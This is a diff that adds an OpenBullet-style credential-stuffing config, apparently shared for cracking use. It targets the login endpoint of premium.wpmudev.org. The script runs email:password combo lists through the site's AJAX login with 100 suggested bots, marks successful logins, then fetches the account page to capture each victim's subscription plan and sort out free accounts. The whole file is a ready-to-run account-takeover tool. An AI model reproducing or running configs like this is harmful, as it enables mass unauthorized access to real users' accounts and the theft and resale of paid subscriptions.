@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "WPMUNDEV",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-28T00:35:05.0084411+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://premium.wpmudev.org/wp-admin/admin-ajax.php" AutoRedirect=TRUE 
+  CONTENT "action=wpmu_wordpress_login&log=<USER>&pwd=<PASS>&redirect_to=https%3A%2F%2Fpremium.wpmudev.org%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "newHeader: https://premium.wpmudev.org/" 
+  HEADER "newHeader: https://premium.wpmudev.org" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "ERROR" 
+  KEYCHAIN Success OR 
+    KEY "success" 
+REQUEST GET "https://premium.wpmudev.org/hub/account/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "userAccessType\":\"free\"" 
+PARSE "<SOURCE>" LR "in\",\"userAccessType\":\"" "\"" Recursive=FALSE -> CAP "PLAN" "" "" 
